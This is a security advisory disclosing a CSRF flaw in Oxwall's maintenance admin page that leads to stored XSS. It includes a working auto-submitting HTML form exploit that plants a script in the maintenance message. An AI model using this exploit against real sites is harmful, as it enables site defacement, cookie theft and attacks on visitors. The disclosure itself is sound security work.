Advisory Details:
 
High-Tech Bridge Security Research Lab discovered vulnerability in Oxwall, which can be exploited to perform CSRF (Cross-Site Request Forgery) attacks. An attacker might be able to put the website under maintenance and perform XSS attacks against website visitors.
 
The vulnerability exists due to failure in the "/admin/pages/maintenance" script to properly verify the source of the HTTP request. A remote attacker can trick a logged-in administrator to visit a page with CSRF exploit and put the entire website under maintenance. Additionally, the attacker is able to inject arbitrary HTML and JavaScript code into maintenance message and execute it in browsers of any website visitor. Successful exploitation of this vulnerability may allow an attacker to steal other usersâ€™ cookies, spread malware to website visitors, and even obtain full control over vulnerable website. 
 
A simple CSRF exploit below puts the website under maintenance and displays a JS popup with "ImmuniWeb" word to every website visitor:
 
 
<form action = "http://[host]/admin/pages/maintenance" method = "POST">
<input type="hidden" name="form_name" value="maintenance">
<input type="hidden" name="maintenance_enable" value="on">
<input type="hidden" name="save" value="Save">
<input type="hidden" name="maintenance_text" value="<script>alert('ImmuniWeb');</script>">
<input value="submit" id="btn" type="submit" />
</form>
<script>
document.getElementById('btn').click();
</script>
